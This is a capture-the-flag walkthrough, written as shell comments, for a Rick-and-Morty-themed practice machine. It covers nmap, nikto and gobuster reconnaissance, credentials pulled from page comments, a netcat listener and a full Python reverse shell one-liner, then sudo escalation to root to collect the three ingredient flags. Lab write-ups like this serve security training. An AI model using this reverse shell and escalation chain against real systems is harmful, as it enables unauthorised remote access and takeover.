#Need to hack the device to find the three secret elements

#first connect to de VPN with sudo openvpn filename.ovpn
#test de connection with ping 
#If you had a response, go to the browser and put the IP
#You'll find a a message from Rick, save it and look inside de HTML code, it has the username un a comment (R1ckRul3s)
#Do a nmap using nmap -sC -sV -oN nmap/initial 'ipaddress' (don't forget to create a directory named nmap before execute the command)
#Look the document inside nmap directory, you'll see that the device has the 20 and 80 port open
#use nikto -h //http:'ipaddress' | tee nikto.log to scan the server
#After nikto command, you'll find a robot.txt that isn't doing anything. If you put the 'ipaddress'/robots.txt you'll see a messagge (Wubbalubbadubdub)
#use the command gobuster dir -u http://$IP -w /usr/share/wordlists/dirb/common.txt -x php,sh,txt,cgi,html,js,css,py to looking for other files in the website
#after gobuster command appears login.php, so put in the browser 'ipaddress'/login.php and put in the usarname R1ckRul3s and password Wubbalubbadubdub
#type grep . Sup3rS3cretPickl3Ingred.txt in the command line and you'll find the first ingredient mr. meeseek hair
#Then, look up for the source page (right click+view page source) and it's a code in a comment.
#Copy the code and put into the terminal with this line: echo 'code' | base64 -d (as many times you need to decode the messagge), but this is a rabbit hole
#run the commandin the terminal: nc -lnvp 9999 to wait for a connection.
#run the command ip addr show tun0 to get YOURIPADDRESS
#inside the webpage, use the reverse shell cheat sheet for python: python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("YOURIPADDRESS",9999));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
#type sudo bash to get a root access
#Take a look into the home root directory (first cd and then ls) and you'll find a 3rd.txt when you open you got the 3rd ingredient that is fleeb juice
#Then, go to the rick directory (cd /home/rick) and run the command cat * to see everything and you'll find the second ingredient that is 1 jerry tear
